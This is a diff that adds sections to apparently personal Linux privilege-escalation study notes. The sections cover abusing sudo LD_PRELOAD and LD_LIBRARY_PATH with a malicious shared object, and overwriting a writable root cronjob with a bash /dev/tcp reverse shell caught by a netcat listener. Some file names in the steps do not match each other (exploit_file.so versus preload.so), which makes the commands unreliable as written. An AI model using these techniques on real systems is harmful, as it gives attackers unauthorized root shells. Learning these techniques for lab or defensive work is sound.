@@ -79,5 +79,81 @@ Matching Defaults entries for user on this host:
 --------------------------------------------------------------
 ~~~
 
+- LD_PRELOAD is an enviornmental variable that loads a shared object before anything else.
+- LD_LIBRARY_PATH is an enviornmental variable that a provides a lists of dirs where shared librarys 
+  are searched for.
+
+### Abusing sudo enviornmental varaiables
+ 
+Create a shared object (one that will spawn a root shell).
+
+~~~
+gcc -fPIC -shared -nostartfiles -o /tmp/exploit_file.so exploit_file.c
+~~~
+
+Change the LD_PRELOAD to the file while running a programme in sudo.
+
+~~~
+sudo LD_PRELOAD=/tmp/preload.so <programme>
+~~~
+
+This will then run the shared object.
+
+**OR**
+
+Use a shared sudo enviornment (LD_LIBRARY_PATH)
+
+Find shared library for a programme
+
+~~~
+ldd /usr/sbin/apache2
+~~~
+
+Create a shared object (that gives root access).
+
+~~~
+gcc -o /tmp/exploit_file.so -shared -fPIC exploit_file.c
+~~~
+
+Then run the programme
+
+~~~
+sudo LD_LIBRARY_PATH=/tmp apache2
+~~~
+
+## CronJobs File permission
+
+Change a cronjob that is running by root user to gain a shell.
+
+First view cronjobs
+~~~
+cat /etc/crontab
+~~~
+
+Then check if any are writeable
+
+~~~
+ls -l (cronjob from etc/crontab list)
+~~~
+
+Replace content of one of them with reverse shell
+
+~~~
+#!/bin/bash
+bash -i >& /dev/tcp/<ip address of host machine>/4444 0>&1
+~~~
+
+Have a netcat listener 
+
+~~~
+nc -lvnp 4444
+~~~
+
+and a root shell should spawn!!
+
+#
+
+
+
 
 
